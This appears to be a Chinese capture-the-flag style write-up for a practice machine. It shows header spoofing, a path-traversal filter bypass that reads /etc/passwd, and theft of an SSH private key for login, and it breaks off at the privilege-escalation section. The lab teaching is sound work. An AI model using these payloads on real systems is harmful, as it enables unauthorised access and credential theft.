@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="群友靶机-Kakeru2 wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="群友靶机-Kakeru2 wp">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/14848.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="群友靶机-Kakeru2 wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-06-04T02:09:55.000Z">
+<meta property="article:modified_time" content="2025-06-04T02:42:14.254Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/14848.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>群友靶机-Kakeru2 wp | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">13</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/14848.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          群友靶机-Kakeru2 wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-06-04 10:09:55 / 修改时间：10:42:14" itemprop="dateCreated datePublished" datetime="2025-06-04T10:09:55+08:00">2025-06-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">群友靶机</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+      
+      
+        <p>群友靶机-Kakeru2 wp</p>
+<span id="more"></span>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>非常常规的机器 ， 我就开放了80和22<br>curl一下 在首页有guayu留下的信息</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">你们的“安全系统”？不堪一击。 ;)</span></span><br><span class="line"><span class="comment">为了方便我下次“回来看看”,我留下了点东西</span></span><br><span class="line"><span class="comment">-guayu</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>说明这个系统被guayu渗透了，并且留了一个后门<br>扫一下目录   如果你用dirsearch直接扫会发现什么都没有<br>用gobuster 指定字典 会发现有一个403的secret.php 但是返回长度和其他的403界面不同</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://192.168.114.232/ -x php,txt,jpg,js,zip,bak </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.114.232/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,jpg,js,zip,bak</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: 403) [Size: 280]</span><br><span class="line">/secret.php           (Status: 403) [Size: 206]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.114.232/secret.php </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>You don&#x27;t have permission to access this resource.<span class="tag">&lt;/<span class="name">p</span>&gt;</span> Maybe I only trust requests from localhost? <span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure></div>
+<p>在这里为了让目标更加明确， 留了个提示： 从本地访问 所以加上X-Forwarded-For标头</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.114.232/secret.php -H &quot;X-Forwarded-For: 127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Guayu 的秘密文件通道<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;congrats&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;highlight&quot;</span>&gt;</span>恭喜你<span class="tag">&lt;/<span class="name">span</span>&gt;</span>你成功通过了第一道验证，找到了这个由 Guayu 精心留下的后门！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>请小心使用，并非所有门都为你敞开...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>当前识别的访问源: <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;highlight&quot;</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">span</span>&gt;</span> (已授权)<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>内部文件探测器 v2.0 <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>输入文件的相对路径 (相对于此脚本位置) 或某些特定服务的已知路径。请注意，此工具内置了一些基本的<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;highlight&quot;</span>&gt;</span>路径安全检查<span class="tag">&lt;/<span class="name">span</span>&gt;</span>。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/secret.php&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;filename&quot;</span>&gt;</span>目标文件:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;例如: welcome.txt 或 config/settings.ini&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[ 探测文件 ]&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 40px; font-size: 0.85em; color: #666; text-align: center;&quot;</span>&gt;</span></span><br><span class="line">        -- 通道维护者: Guayu </span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>这是一个有过滤的读取文件的页面，你可以在输入框中输入文件，也可以在url里面直接带上filename参数<br>这里先看看当前secret.php的过滤逻辑</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CAL"><figure class="iseeu highlight /cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl <span class="string">&quot;192.168.114.232/secret.php?filename=secret.php&quot;</span> -H <span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (</span><br><span class="line">        substr($filename, <span class="number">0</span>, <span class="number">1</span>) === &amp;<span class="string">#039</span>;/&amp;<span class="string">#039</span>; ||</span><br><span class="line">        substr($filename, <span class="number">0</span>, <span class="number">3</span>) === &amp;<span class="string">#039</span>;../&amp;<span class="string">#039</span>; ||</span><br><span class="line">        strpos($filename, &amp;<span class="string">#039</span>;\\&amp;<span class="string">#039</span>;) !== <span class="literal">false</span> ||</span><br><span class="line">        strpos($filename, &amp;<span class="string">#039</span>;//&amp;<span class="string">#039</span>;) !== <span class="literal">false</span> ||</span><br><span class="line">	    strpos($filename, &amp;<span class="string">#039</span>;...&amp;<span class="string">#039</span>;) !== <span class="literal">false</span> ||</span><br><span class="line">	    strpos($filename, &amp;<span class="string">#039</span>;://&amp;<span class="string">#039</span>;) !== <span class="literal">false</span></span><br><span class="line">    ) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>这里就是不能以<code>/</code>开头，不能用<code>...</code>这种复写绕过，并且禁止使用php伪协议<br>这里考察的是用<code>./</code> 这个当前目录和<code>../</code>结合来绕过<br>所以用<code>./.././.././../etc/passwd</code>测试是否可以读取文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl &quot;192.168.114.232/secret.php?filename=./.././.././../etc/passwd&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> <span class="title class_">List</span> <span class="symbol">Manager:</span>/var/<span class="symbol">list:</span>/usr/sbin/nologin</span><br><span class="line"><span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> <span class="title class_">Bug</span>-<span class="title class_">Reporting</span> <span class="title class_">System</span> (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">_apt:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">65534</span>::/<span class="symbol">nonexistent:</span>/usr/sbin/nologin</span><br><span class="line">systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">102</span><span class="symbol">:systemd</span> <span class="title class_">Time</span> <span class="title class_">Synchronization</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">103</span><span class="symbol">:systemd</span> <span class="title class_">Network</span> <span class="title class_">Management</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:systemd</span> <span class="title class_">Resolver</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">coredump:</span><span class="symbol">x:</span><span class="number">999</span><span class="symbol">:</span><span class="number">999</span><span class="symbol">:systemd</span> <span class="title class_">Core</span> <span class="symbol">Dumper:</span>/<span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">104</span><span class="symbol">:</span><span class="number">110</span>::/<span class="symbol">nonexistent:</span>/usr/sbin/nologin</span><br><span class="line"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">65534</span>::/run/<span class="symbol">sshd:</span>/usr/sbin/nologin</span><br><span class="line"><span class="symbol">guayu:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:</span>,,,<span class="symbol">:/home/guayu</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure></div>
+<p>发现是可以的，然后有一个guayu用户，读取读取&#x2F;home&#x2F;guayu&#x2F;.ssh&#x2F;id_rsa 获得该用户的私钥就能登上这个用户</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># chmod 600 id_rsa                                                                                                </span></span><br><span class="line">                                                                                                                                                         </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># ls -al id_rsa   </span></span><br><span class="line">-rw<span class="comment">------- 1 root root 3381 Jun  4 10:22 id_rsa</span></span><br><span class="line">                                                                                                                                                         </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># ssh guayu@192.168.114.232 -i id_rsa</span></span><br><span class="line">Linux Kakeru2 <span class="number">4.19</span><span class="number">.0</span><span class="number">-27</span>-amd64 <span class="comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> <span class="keyword">the</span> Debian GNU/Linux system are free software;</span><br><span class="line"><span class="keyword">the</span> exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> <span class="keyword">the</span></span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> <span class="keyword">the</span> extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Mon Jun  <span class="number">2</span> <span class="number">11</span>:<span class="number">29</span>:<span class="number">06</span> <span class="number">2025</span> <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.114</span><span class="number">.11</span></span><br><span class="line">guayu@Kakeru2:~$ ls <span class="built_in">id</span></span><br><span class="line">ls: cannot access &#x27;<span class="built_in">id</span>&#x27;: No such <span class="built_in">file</span> <span class="keyword">or</span> directory</span><br><span class="line">guayu@Kakeru2:~$ <span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1000</span>(guayu) gid=<span class="number">1000</span>(guayu) groups=<span class="number">1000</span>(guayu)</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>sudo -l 发现可以使用groff 指令 这个是一个格式化手写文档的工具</p>
